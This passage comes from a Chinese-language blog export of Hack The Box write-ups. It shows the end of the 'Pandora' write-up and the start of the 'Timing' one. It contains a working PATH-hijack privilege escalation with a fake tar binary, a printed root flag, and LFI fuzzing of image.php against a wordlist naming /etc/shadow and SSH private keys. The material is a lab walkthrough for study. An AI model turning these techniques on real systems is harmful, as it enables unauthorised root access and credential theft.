05:59:56 UTC 2022 System load: 0.09 Processes: 280 Usage of /: 63.0% of 4.87GB Users logged in: 1 Memory usage: 9% IPv4 address for eth0: 10.10.11.136 Swap usage: 0% =&gt; /boot is using 91.8% of 219MB 0 updates can be applied immediately. The list of available updates is more than a week old. To check for new updates run: sudo apt update Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings The programs included with the Ubuntu system are free software; the exact distribution terms for each program are described in the individual files in /usr/share/doc/*/copyright. Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by applicable law. matt@pandora:~$ whoami&amp;&amp;id matt uid=1000(matt) gid=1000(matt) groups=1000(matt) 切换到matt的用户目录，然后创建一个假的tar可执行文件，，并将matt的家路径注入PATH变量中 cd /home/matt/ echo &quot;/bin/bash&quot; &gt; tar chmod +x tar export PATH=/home/matt:$PATH 然后运行&#x2F;usr&#x2F;bin&#x2F;pandora_backup文件 matt@pandora:~$ /usr/bin/pandora_backup PandoraFMS Backup Utility Now attempting to backup PandoraFMS client root@pandora:~# whoami&amp;&amp;id root uid=0(root) gid=1000(matt) groups=1000(matt) 成功提权到root用户 root@pandora:~# cd /root root@pandora:/root# ls root.txt root@pandora:/root# cat root.txt 262d5cfca2599a11b0c1dcfa552a150e 成功拿到root权限的flag文件","categories":[],"tags":[{"name":"Hackthebox","slug":"Hackthebox","permalink":"http://www.lucifiel.com/tags/Hackthebox/"}]},{"title":"Timing - Hackthebox","slug":"Hackthebox/Medium/Hackthebox-Timing","date":"2022-01-01T11:38:36.000Z","updated":"2023-06-13T03:54:08.000Z","comments":true,"path":"2022/01/01/Hackthebox/Medium/Hackthebox-Timing/","link":"","permalink":"http://www.lucifiel.com/2022/01/01/Hackthebox/Medium/Hackthebox-Timing/","excerpt":"","text":"Hackthebox - Timing靶场信息 靶场类型 信息搜集使用nmap进行端口扫描 ┌──(root💀kali)-[~/Desktop] └─# nmap -sS -A -sC -sV -p- --min-rate 5000 10.10.11.135 Starting Nmap 7.91 ( https://nmap.org ) at 2021-12-14 00:09 EST Nmap scan report for bogon (10.10.11.135) Host is up (0.28s latency). Not shown: 65533 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 d2:5c:40:d7:c9:fe:ff:a8:83:c3:6e:cd:60:11:d2:eb (RSA) | 256 18:c9:f7:b9:27:36:a1:16:59:23:35:84:34:31:b3:ad (ECDSA) |_ 256 a2:2d:ee:db:4e:bf:f9:3f:8b:d4:cf:b4:12:d8:20:f2 (ED25519) 80/tcp open http Apache httpd 2.4.29 ((Ubuntu)) |_http-server-header: Apache/2.4.29 (Ubuntu) No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ). TCP/IP fingerprint: OS:SCAN(V=7.91%E=4%D=12/14%OT=22%CT=1%CU=39140%PV=Y%DS=2%DC=T%G=Y%TM=61B828 OS:78%P=x86_64-pc-linux-gnu)SEQ(SP=F8%GCD=1%ISR=10C%TI=Z%CI=Z%II=I%TS=A)SEQ OS:(SP=F9%GCD=1%ISR=10C%TI=Z%CI=Z%TS=A)OPS(O1=M54DST11NW7%O2=M54DST11NW7%O3 OS:=M54DNNT11NW7%O4=M54DST11NW7%O5=M54DST11NW7%O6=M54DST11)WIN(W1=FE88%W2=F OS:E88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN(R=Y%DF=Y%T=40%W=FAF0%O=M54DNNSNW OS:7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF OS:=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O= OS:%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W= OS:0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RI OS:PCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S) Network Distance: 2 hops Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel TRACEROUTE (using port 5900/tcp) HOP RTT ADDRESS 1 278.35 ms 10.10.14.1 2 278.35 ms bogon (10.10.11.135) OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 347.67 seconds 先去80端口看看是什么服务 这是一个登录页面，测试一下弱口令没有突破口，扫一下目录看看 ┌──(root💀kali)-[~/Desktop] └─# ffuf -u &quot;http://10.10.11.135/FUZZ&quot; -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt -e .php -fc 403 /&#39;___\\ /&#39;___\\ /&#39;___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v1.3.1 Kali Exclusive &lt;3 ________________________________________________ :: Method : GET :: URL : http://10.10.11.135/FUZZ :: Wordlist : FUZZ: /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt :: Extensions : .php :: Follow redirects : false :: Calibration : false :: Timeout : 10 :: Threads : 40 :: Matcher : Response status: 200,204,301,302,307,401,403,405 :: Filter : Response status: 403 ________________________________________________ login.php [Status: 200, Size: 5609, Words: 1755, Lines: 178] images [Status: 301, Size: 313, Words: 20, Lines: 10] index.php [Status: 302, Size: 0, Words: 1, Lines: 1] js [Status: 301, Size: 309, Words: 20, Lines: 10] css [Status: 301, Size: 310, Words: 20, Lines: 10] profile.php [Status: 302, Size: 0, Words: 1, Lines: 1] logout.php [Status: 302, Size: 0, Words: 1, Lines: 1] image.php [Status: 200, Size: 0, Words: 1, Lines: 1] upload.php [Status: 302, Size: 0, Words: 1, Lines: 1] header.php [Status: 302, Size: 0, Words: 1, Lines: 1] footer.php [Status: 200, Size: 3937, Words: 1307, Lines: 116] . [Status: 302, Size: 0, Words: 1, Lines: 1] db_conn.php [Status: 200, Size: 0, Words: 1, Lines: 1] :: Progress: [86006/86006] :: Job [1/1] :: 70 req/sec :: Duration: [0:17:21] :: Errors: 8 :: 这边没有跳转的只有一个image.php，但是是空白的，同时还存在一个images目录，我感觉这里有点问题，去看看images目录有啥东西 ┌──(root💀kali)-[~/Desktop] └─# ffuf -u &quot;http://10.10.11.135/images/FUZZ&quot; -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt -e .php -fc 403 /&#39;___\\ /&#39;___\\ /&#39;___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v1.3.1 Kali Exclusive &lt;3 ________________________________________________ :: Method : GET :: URL : http://10.10.11.135/images/FUZZ :: Wordlist : FUZZ: /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt :: Extensions : .php :: Follow redirects : false :: Calibration : false :: Timeout : 10 :: Threads : 40 :: Matcher : Response status: 200,204,301,302,307,401,403,405 :: Filter : Response status: 403 ________________________________________________ uploads [Status: 301, Size: 321, Words: 20, Lines: 10] :: Progress: [86006/86006] :: Job [1/1] :: 78 req/sec :: Duration: [0:15:38] :: Errors: 4 :: 目录&#x2F;images&#x2F;uploads&#x2F;目录，然后还存在一个image.php文件，我总觉得是这个目录内的文件，是通过image.php这个文件来查看的，fuzz一下看看 ┌──(root💀kali)-[~/Desktop] └─# ffuf -u &quot;http://10.10.11.135/image.php?file=FUZZ&quot; -w /usr/share/seclists/Fuzzing/LFI/LFI-gracefulsecurity-linux.txt /&#39;___\\ /&#39;___\\ /&#39;___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v1.3.1 Kali Exclusive &lt;3 ________________________________________________ :: Method : GET :: URL : http://10.10.11.135/image.php?file=FUZZ :: Wordlist : FUZZ: /usr/share/seclists/Fuzzing/LFI/LFI-gracefulsecurity-linux.txt :: Follow redirects : false :: Calibration : false :: Timeout : 10 :: Threads : 40 :: Matcher : Response status: 200,204,301,302,307,401,403,405 ________________________________________________ /etc/httpd/logs/access.log [Status: 200, Size: 0, Words: 1, Lines: 1] /etc/ftpchroot [Status: 200, Size: 0, Words: 1, Lines: 1] /etc/grub.conf [Status: 200, Size: 0, Words: 1, Lines: 1] /etc/chrootUsers [Status: 200, Size: 0, Words: 1, Lines: 1] /etc/apache2/apache2.conf [Status: 200, Size: 0, Words: 1, Lines: 1] /etc/shadow [Status: 200, Size: 0, Words: 1, Lines: 1] /etc/fstab [Status: 200, Size: 0, Words: 1, Lines: 1] /etc/hosts [Status: 200, Size: 0, Words: 1, Lines: 1] /etc/httpd/logs/error_log [Status: 200, Size: 0, Words: 1, Lines: 1] /etc/logrotate.d/proftpd [Status: 200, Size: 0, Words: 1, Lines: 1] /etc/ftphosts [Status: 200, Size: 0, Words: 1, Lines: 1] /etc/logrotate.d/ftp [Status: 200, Size: 0, Words: 1, Lines: 1] /etc/groups [Status: 200, Size: 0, Words: 1, Lines: 1] /etc/cron.deny [Status: 200, Size: 0, Words: 1, Lines: 1] /etc/httpd/access.conf [Status: 200, Size: 0, Words: 1, Lines: 1] /etc/inetd.conf [Status: 200, Size: 0, Words: 1, Lines: 1] /etc/httpd/srm.conf [Status: 200, Size: 0, Words: 1, Lines: 1] /etc/httpd/logs/access_log [Status: 200, Size: 0, Words: 1, Lines: 1] /etc/cron.allow [Status: 200, Size: 0, Words: 1, Lines: 1] /etc/at.allow [Status: 200, Size: 0, Words: 1, Lines: 1] /etc/httpd/httpd.conf [Status: 200, Size: 0, Words: 1, Lines: 1] /etc/aliases [Status: 200, Size: 0, Words: 1, Lines: 1] /etc/lighttpd.conf [Status: 200, Size: 0, Words: 1, Lines: 1] /etc/chttp.conf [Status: 200, Size: 0, Words: 1, Lines: 1] /etc/php/apache/php.ini [Status: 200, Size: 0, Words: 1, Lines: 1] /etc/issue [Status: 200, Size: 0, Words: 1, Lines: 1] /etc/anacrontab [Status: 200, Size: 0, Words: 1, Lines: 1] /etc/passwd [Status: 200, Size: 0, Words: 1, Lines: 1] /etc/httpd/php.ini [Status: 200, Size: 0, Words: 1, Lines: 1] /etc/mysql/my.cnf [Status: 200, Size: 0, Words: 1, Lines: 1] /etc/lilo.conf [Status: 200, Size: 0, Words: 1, Lines: 1] /etc/npasswd [Status: 200, Size: 0, Words: 1, Lines: 1] /etc/profile [Status: 200, Size: 0, Words: 1, Lines: 1] /etc/crontab [Status: 200, Size: 0, Words: 1, Lines: 1] /etc/cups/cupsd.conf [Status: 200, Size: 0, Words: 1, Lines: 1] /etc/pure-ftpd.conf [Status: 200, Size: 0, Words: 1, Lines: 1] /etc/pureftpd.passwd [Status: 200, Size: 0, Words: 1, Lines: 1] /etc/networks [Status: 200, Size: 0, Words: 1, Lines: 1] /etc/motd [Status: 200, Size: 0, Words: 1, Lines: 1] /etc/bashrc [Status: 200, Size: 0, Words: 1, Lines: 1] /etc/lsb-release [Status: 200, Size: 0, Words: 1, Lines: 1] /etc/my.cnf [Status: 200, Size: 0, Words: 1, Lines: 1] /etc/php4.4/fcgi/php.ini [Status: 200, Size: 0, Words: 1, Lines: 1] /etc/logrotate.d/vsftpd.log [Status: 200, Size: 0, Words: 1, Lines: 1] /etc/pureftpd.pdb [Status: 200, Size: 0, Words: 1, Lines: 1] /etc/php/php4/php.ini [Status: 200, Size: 0, Words: 1, Lines: 1] /etc/pure-ftpd/pure-ftpd.pdb [Status: 200, Size: 0, Words: 1, Lines: 1] /etc/samba/smb.conf [Status: 200, Size: 0, Words: 1, Lines: 1] /etc/ssh/ssh_config [Status: 200, Size: 0, Words: 1, Lines: 1] /etc/ssh/ssh_host_dsa_key.pub [Status: 200, Size: 0, Words: 1, Lines: 1] /etc/sysconfig/network [Status: 200, Size: 0, Words: 1, Lines: 1] /etc/ftpaccess [Status: 200, Size: 0, Words: 1, Lines: 1] /etc/apache2/httpd.conf [Status: 200, Size: 0, Words: 1, Lines: 1] /etc/passwd [Status: 200, Size: 0, Words: 1, Lines: 1] /etc/php/apache2/php.ini [Status: 200, Size: 0, Words: 1, Lines: 1] /etc/php4/apache/php.ini [Status: 200, Size: 0, Words: 1, Lines: 1] /etc/modules.conf [Status: 200, Size: 0, Words: 1, Lines: 1] /etc/php5/apache/php.ini [Status: 200, Size: 0, Words: 1, Lines: 1] /etc/termcap [Status: 200, Size: 0, Words: 1, Lines: 1] /etc/pure-ftpd/pure-ftpd.conf [Status: 200, Size: 0, Words: 1, Lines: 1] /etc/php/cgi/php.ini [Status: 200, Size: 0, Words: 1, Lines: 1] /etc/ssh/ssh_host_dsa_key [Status: 200, Size: 0, Words: 1, Lines: 1] /etc/vsftpd.chroot_list [Status: 200, Size: 0, Words: 1, Lines: 1] /etc/resolv.conf [Status: 200, Size: 0, Words: 1, Lines: 1] /etc/php.ini [Status: 200, Size: 0, Words: 1, Lines: 1] /etc/vsftpd/vsftpd.conf [Status: 200, Size: 0, Words: 1, Lines: 1] /etc/my.conf [Status: 200, Size: 0, Words: 1, Lines: 1] /proc/cpuinfo [Status: 200, Size: 0, Words: 1, Lines: 1] /proc/filesystems [Status: 200, Size: 0, Words: 1, Lines: 1] /proc/interrupts [Status: 200, Size: 0, Words: 1, Lines: 1] /proc/ioports [Status: 200, Size: 0, Words: 1, Lines: 1] /etc/syslog.conf [Status: 200, Size: 0, Words: 1, Lines: 1] /proc/modules [Status: 200, Size: 0, Words: 1, Lines: 1] /proc/stat [Status: 200, Size: 0, Words: 1, Lines: 1] /etc/vsftpd.conf [Status: 200, Size: 0, Words: 1, Lines: 1] /etc/vhcs2/proftpd/proftpd.conf [Status: 200, Size: 0, Words: 1, Lines: 1] /etc/php/php.ini [Status: 200, Size: 0, Words: 1, Lines: 1] /etc/wu-ftpd/ftpaccess [Status: 200, Size: 0, Words: 1, Lines: 1] /proc/version [Status: 200, Size: 0, Words: 1, Lines: 1] /etc/network/interfaces [Status: 200, Size: 0, Words: 1, Lines: 1] /etc/bootptab [Status: 200, Size: 0, Words: 1, Lines: 1] /root/anaconda-ks.cfg [Status: 200, Size: 0, Words: 1, Lines: 1] /opt/xampp/etc/php.ini [Status: 200, Size: 0, Words: 1, Lines: 1] /usr/etc/pure-ftpd.conf [Status: 200, Size: 0, Words: 1, Lines: 1] /etc/ssh/ssh_host_key.pub [Status: 200, Size: 0, Words: 1, Lines: 1] /usr/lib/php/php.ini [Status: 200, Size: 0, Words: 1, Lines: 1] /usr/local/apache/conf/modsec.conf [Status: 200, Size: 0, Words: 1, Lines: 1] /usr/local/apache/log [Status: 200, Size: 0, Words: 1, Lines: 1] /usr/local/apache/logs [Status: 200, Size: 0, Words: 1, Lines: 1] /usr/local/apache/logs/access_log [Status: 200, Size: 0, Words: 1, Lines: 1] /usr/local/apache/logs/access.log [Status: 200, Size: 0, Words: 1, Lines: 1] /etc/httpd/logs/error.log [Status: 200, Size: 0, Words: 1, Lines: 1] /usr/local/apache/error_log [Status: 200, Size: 0, Words: 1, Lines: 1] /usr/local/cpanel/logs [Status: 200, Size: 0, Words: 1, Lines: 1] /logs/security_log [Status: 200, Size: 0, Words: 1, Lines: 1] /usr/local/cpanel/logs/error_log [Status: 200, Size: 0, Words: 1, Lines: 1] /etc/motd [Status: 200, Size: 0, Words: 1, Lines: 1] /etc/redhat-release [Status: 200, Size: 0, Words: 1, Lines: 1] /proc/swaps [Status: 200, Size: 0, Words: 1, Lines: 1] /usr/local/etc/httpd/logs/access_log [Status: 200, Size: 0, Words: 1, Lines: 1] /etc/hosts.deny [Status: 200, Size: 0, Words: 1, Lines: 1] /etc/at.deny [Status: 200, Size: 0, Words: 1, Lines: 1] /usr/local/etc/httpd/logs/error_log [Status: 200, Size: 0, Words: 1, Lines: 1] /usr/local/etc/php.ini [Status: 200, Size: 0, Words: 1, Lines: 1] /usr/local/etc/pureftpd.pdb [Status: 200, Size: 0, Words: 1, Lines: 1] /usr/local/php4/lib/php.ini [Status: 200, Size: 0, Words: 1, Lines: 1] /usr/local/php5/httpd.conf [Status: 200, Size: 0, Words: 1, Lines: 1] /usr/lib/php.ini [Status: 200, Size: 0, Words: 1, Lines: 1] /usr/local/php5/lib/php.ini [Status: 200, Size: 0, Words: 1, Lines: 1] /usr/local/cpanel/logs/license_log [Status: 200, Size: 0, Words: 1, Lines: 1] /etc/proftp.conf [Status: 200, Size: 0, Words: 1, Lines: 1] /opt/lampp/etc/httpd.conf [Status: 200, Size: 0, Words: 1, Lines: 1] /usr/local/php/lib/php.ini [Status: 200, Size: 0, Words: 1, Lines: 1] /usr/local/pureftpd/etc/pureftpd.pdn [Status: 200, Size: 0, Words: 1, Lines: 1] /usr/local/cpanel/logs/access_log [Status: 200, Size: 0, Words: 1, Lines: 1] /usr/local/www/logs/httpd_log [Status: 200, Size: 0, Words: 1, Lines: 1] /usr/local/Zend/etc/php.ini [Status: 200, Size: 0, Words: 1, Lines: 1] /usr/local/lib/php.ini [Status: 200, Size: 0, Words: 1, Lines: 1] /etc/wu-ftpd/ftphosts [Status: 200, Size: 0, Words: 1, Lines: 1] /var/adm/log/xferlog [Status: 200, Size: 0, Words: 1, Lines: 1] /usr/local/apache/error.log [Status: 200, Size: 0, Words: 1, Lines: 1] /var/apache2/config.inc [Status: 200, Size: 0, Words: 1, Lines: 1] /etc/php4/cgi/php.ini [Status: 200, Size: 0, Words: 1, Lines: 1] /var/apache/logs/error_log [Status: 200, Size: 0, Words: 1, Lines: 1] /var/cpanel/cpanel.config [Status: 200, Size: 0, Words: 1, Lines: 1] /var/local/www/conf/php.ini [Status: 200, Size: 0, Words: 1, Lines: 1] /usr/local/php5/httpd.conf.php [Status: 200, Size: 0, Words: 1, Lines: 1] /usr/local/cpanel/logs/stats_log [Status: 200, Size: 0, Words: 1, Lines: 1] /usr/sbin/pure-config.pl [Status: 200, Size: 0, Words: 1, Lines: 1] /var/log/apache2/access_log [Status: 200, Size: 0, Words: 1, Lines: 1] /etc/snmpd.conf [Status: 200, Size: 0, Words: 1, Lines: 1] /var/log/apache2/access.log [Status: 200, Size: 0, Words: 1, Lines: 1] /var/log/apache/access.log [Status: 200, Size: 0, Words: 1, Lines: 1] /usr/local/apache/conf/php.ini [Status: 200, Size: 0, Words: 1, Lines: 1] /logs/security_debug_log [Status: 200, Size: 0, Words: 1, Lines: 1] /var/lib/mysql/my.cnf [Status: 200, Size: 0, Words: 1, Lines: 1] /etc/ssh/ssh_host_key [Status: 200, Size: 0, Words: 1, Lines: 1] /var/log/apache-ssl/access.log [Status: 200, Size: 0, Words: 1, Lines: 1] /usr/local/pureftpd/etc/pure-ftpd.conf [Status: 200, Size: 0, Words: 1, Lines: 1] /etc/inittab [Status: 200, Size: 0, Words: 1, Lines: 1] /etc/exports [Status: 200, Size: 0, Words: 1, Lines: 1] /etc/hosts.allow [Status: 200, Size: 0, Words: 1, Lines: 1] /var/log/cups/error.log [Status: 200, Size: 0, Words: 1, Lines: 1] /usr/local/pureftpd/sbin/pure-config.pl [Status: 200, Size: 0, Words: 1, Lines: 1] /var/log/daemon.log [Status: 200, Size: 0, Words: 1, Lines: 1] /var/log/debug [Status: 200, Size: 0, Words: 1, Lines: 1] /var/log/dmesg [Status: 200, Size: 0, Words: 1, Lines: 1] /usr/local/apache/audit_log [Status: 200, Size: 0, Words: 1, Lines: 1] /var/log/dpkg.log [Status: 200, Size: 0, Words: 1, Lines: 1] /etc/wu-ftpd/ftpusers [Status: 200, Size: 0, Words: 1, Lines: 1] /var/log/exim_mainlog [Status: 200, Size: 0, Words: 1, Lines: 1] /proc/mounts [Status: 200, Size: 0, Words: 1, Lines: 1] /var/log/apache2/error_log [Status: 200, Size: 0, Words: 1, Lines: 1] /var/log/exim_paniclog [Status: 200, Size: 0, Words: 1, Lines: 1] /var/log/apache/error.log [Status: 200, Size: 0, Words: 1, Lines: 1] /var/log/exim_rejectlog [Status: 200, Size: 0, Words: 1, Lines: 1] /var/log/exim/rejectlog [Status: 200, Size: 0, Words: 1, Lines: 1] /var/log/faillog [Status: 200, Size: 0, Words: 1, Lines: 1] /var/log/httpd/access_log [Status: 200, Size: 0, Words: 1, Lines: 1] /etc/httpd/conf/httpd.conf [Status: 200, Size: 0, Words: 1, Lines: 1] /var/log/httpd/error.log [Status: 200, Size: 0, Words: 1, Lines: 1] /proc/meminfo [Status: 200, Size: 0, Words: 1, Lines: 1] /var/htmp [Status: 200, Size: 0, Words: 1, Lines: 1] /var/log/apache-ssl/error.log [Status: 200, Size: 0, Words: 1, Lines: 1] /var/log/httpsd/ssl.access_log [Status: 200, Size: 0, Words: 1, Lines: 1] /var/log/httpsd/ssl_log [Status: 200, Size: 0, Words: 1, Lines: 1] /usr/local/php4/httpd.conf.php [Status: 200, Size: 0, Words: 1, Lines: 1] /var/log/kern.log [Status: 200, Size: 0, Words: 1, Lines: 1] /var/log/lighttpd/error.log [Status: 200, Size: 0, Words: 1, Lines: 1] /var/log/lighttpd/lighttpd.error.log [Status: 200, Size: 0, Words: 1, Lines: 1] /var/log/mail.info [Status: 200, Size: 0, Words: 1, Lines: 1] /var/log/exim/mainlog [Status: 200, Size: 0, Words: 1, Lines: 1] /var/log/ftp-proxy/ftp-proxy.log [Status: 200, Size: 0, Words: 1, Lines: 1] /var/log/messages [Status: 200, Size: 0, Words: 1, Lines: 1] /etc/mtab [Status: 200, Size: 0, Words: 1, Lines: 1] /var/log/lighttpd/access.log [Status: 200, Size: 0, Words: 1, Lines: 1] /var/log/mail.warn [Status: 200, Size: 0, Words: 1, Lines: 1] /var/log/httpd/error_log [Status: 200, Size: 0, Words: 1, Lines: 1] /usr/local/cpanel/logs/login_log [Status: 200, Size: 0, Words: 1, Lines: 1] /var/log/ftp-proxy [Status: 200, Size: 0, Words: 1, Lines: 1] /var/log/mysqlderror.log [Status: 200, Size: 0, Words: 1, Lines: 1] /etc/php4/apache2/php.ini [Status: 200, Size: 0, Words: 1, Lines: 1] /var/log/pureftpd.log [Status: 200, Size: 0, Words: 1, Lines: 1] /var/log/pure-ftpd/pure-ftpd.log [Status: 200, Size: 0, Words: 1, Lines: 1] /var/log/maillog [Status: 200, Size: 0, Words: 1, Lines: 1] /var/log/mysql.log [Status: 200, Size: 0, Words: 1, Lines: 1] /var/log/message [Status: 200, Size: 0, Words: 1, Lines: 1] /var/log/vsftpd.log [Status: 200, Size: 0, Words: 1, Lines: 1] /var/log/wtmp [Status: 200, Size: 0, Words: 1, Lines: 1] /var/log/ftplog [Status: 200, Size: 0, Words: 1, Lines: 1] /var/log/xferlog [Status: 200, Size: 0, Words: 1, Lines: 1] /var/log/lastlog [Status: 200, Size: 0, Words: 1, Lines: 1] /var/log/yum.log [Status: 200, Size: 0, Words: 1, Lines: 1] /var/spool/cron/crontabs/root [Status: 200, Size: 0, Words: 1, Lines: 1] /var/log/apache/access_log [Status: 200, Size: 0, Words: 1, Lines: 1] /var/lib/mysql/mysql/user.MYD [Status: 200, Size: 0, Words: 1, Lines: 1] /var/www/log/access_log [Status: 200, Size: 0, Words: 1, Lines: 1] /var/log/lighttpd/lighttpd.access.log [Status: 200, Size: 0, Words: 1, Lines: 1] ~/.bash_profile [Status: 200, Size: 0, Words: 1, Lines: 1] ~/.bashrc [Status: 200, Size: 0, Words: 1, Lines: 1] /var/log/secure [Status: 200, Size: 0, Words: 1, Lines: 1] /var/webmin/miniserv.log [Status: 200, Size: 0, Words: 1, Lines: 1] /etc/proftpd/proftpd.conf [Status: 200, Size: 0, Words: 1, Lines: 1] /var/log/mail.log [Status: 200, Size: 0, Words: 1, Lines: 1] ~/.mysql_history [Status: 200, Size: 0, Words: 1, Lines: 1] /logs/pure-ftpd.log [Status: 200, Size: 0, Words: 1, Lines: 1] ~/.profile [Status: 200, Size: 0, Words: 1, Lines: 1] ~/.ssh/authorized_keys [Status: 200, Size: 0, Words: 1, Lines: 1] ~/.atfp_history [Status: 200, Size: 0, Words: 1, Lines: 1] /var/log/apache2/error.log [Status: 200, Size: 0, Words: 1, Lines: 1] ~/.nano_history [Status: 200, Size: 0, Words: 1, Lines: 1] /var/log/exim.paniclog [Status: 200, Size: 0, Words: 1, Lines: 1] ~/.login [Status: 200, Size: 0, Words: 1, Lines: 1] /var/mysql.log [Status: 200, Size: 0, Words: 1, Lines: 1] ~/.ssh/id_rsa [Status: 200, Size: 0, Words: 1, Lines: 1] ~/.ssh/id_rsa.pub [Status: 200, Size: 0, Words: 1, Lines: 1] ~/.php_history [Status: 200, Size: 0, Words: 1, Lines: 1] /etc/printcap [Status: 200, Size: 0, Words: 1, Lines: 1] /var/log/mysql/mysql-slow.log [Status: 200, Size: 0, Words: 1, Lines: 1] ~/.ssh/identity.pub [Status: 200, Size: 0, Words: 1, Lines: 1] /etc/ssh/sshd_config [Status: 200, Size: 0, Words: 1, Lines: 1] ~/.viminfo [Status: 200, Size: 0, Words: 1, Lines: 1] ~/.wm_style [Status: 200, Size: 0, Words: 1, Lines: 1] /var/log/proftpd [Status: 200, Size: 0, Words: 1, Lines: 1] /var/log/httpd/access.log [Status: 200, Size: 0, Words: 1, Lines: 1] ~/.xinitrc [Status: 200, Size: 0, Words: 1, Lines: 1] ~/.xsession [Status: 200, Size: 0, Words: 1, Lines: 1] /var/log/apache/error_log [Status: 200, Size: 0, Words: 1, Lines: 1] /usr/local/php/httpd.conf [Status: 200, Size: 0, Words: 1, Lines: 1] ~/.logout [Status: 200, Size: 0, Words: 1, Lines: 1] /var/www/logs/error.log [Status: 200, Size: 0, Words: 1, Lines: 1] /etc/pure-ftpd/putreftpd.pdb [Status: 200, Size: 0, Words: 1, Lines: 1] ~/.ssh/id_dsa [Status: 200, Size: 0, Words: 1, Lines: 1] ~/.ssh/id_dsa.pub [Status: 200, Size: 0, Words: 1, Lines: 1] /etc/php5/apache2/php.ini [Status: 200, Size: 0, Words: 1, Lines: 1] ~/.bash_logout [Status: 200, Size: 0, Words: 1, Lines: 1] /proc/self/net/arp [Status: 200, Size: 0, Words: 1, Lines: 1] /var/www/logs/access.log [Status: 200, Size: 0, Words: 1, Lines: 1] /var/www/logs/access_log [Status: 200, Size: 0, Words: 1, Lines: 1] ~/.ssh/identity [Status: 200, Size: 0, Words: 1, Lines: 1] /etc/php4/apache2/php.ini [Status: 200, Size: 0, Words: 1, Lines: 1] /usr/local/etc/pure-ftpd.conf [Status: 200, Size: 0, Words: 1, Lines: 1] /usr/local/php4/httpd.conf [Status: 200, Size: 0, Words: 1, Lines: 1] ~/.bash_history [Status: 200, Size: 0, Words: 1, Lines: 1] ~/.Xdefaults [Status: 200, Size: 0, Words: 1, Lines: 1] /usr/local/php/httpd.conf.ini [Status: 200, Size: 0, Words: 1, Lines: 1] ~/.gtkrc [Status: 200, Size: 0, Words: 1, Lines: 1] /var/www/log/error_log [Status: 200, Size: 0, Words: 1, Lines: 1] /var/apache/logs/access_log [Status: 200, Size: 0, Words: 1, Lines: 1] ~/.Xresources [Status: 200, Size: 0, Words: 1, Lines: 1] /var/log/auth.log [Status: 200, Size: 0, Words: 1, Lines: 1] /var/log/boot [Status: 200, Size: 0, Words: 1, Lines: 1] /var/log/chttp.log [Status: 200, Size: 0, Words: 1, Lines: 1] /var/log/mysql/mysql-bin.log [Status: 200, Size: 0, Words: 1, Lines: 1] /var/log/mysql/mysql.log [Status: 200, Size: 0, Words: 1, Lines: 1] /var/run/utmp [Status: 200, Size: 0, Words: 1, Lines: 1] /var/www/logs/error_log [Status: 200, Size: 0, Words: 1, Lines: 1] :: Progress: [257/257] :: Job [1/1] :: 19 req/sec :: Duration: [0:00:23] :: Errors: 0 :: 这边可以fuzz出来，但内容都是0，证明参数不对，尝试一下其他参数 ┌──(root💀kali)-[~/Desktop] └─# ffuf -u &quot;http://10.10.11.135/image.php?img=FUZZ&quot; -w /usr/share/seclists/Fuzzing/LFI/LFI-gracefulsecurity-linux.txt -fs 0 /&#39;___\\ /&#39;___\\ /&#39;___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v1.3.1 Kali Exclusive &lt;3 ________________________________________________ :: Method : GET :: URL : http://10.10.11.135/image.php?img=FUZZ :: Wordlist : FUZZ: /usr/share/seclists/Fuzzing/LFI/LFI-gracefulsecurity-linux.txt :: Follow redirects : false :: Calibration : false :: Timeout : 10 :: Threads : 40 :: Matcher : Response status: 200,204,301,302,307,401,403,405 :: Filter : Response size: 0 ________________________________________________ /etc/aliases [Status: 200, Size: 25, Words: 3, Lines: 1] /etc/at.allow [Status: 200, Size: 25, Words: 3, Lines: 1] /etc/hosts.deny [Status: 200, Size: 25, Words: 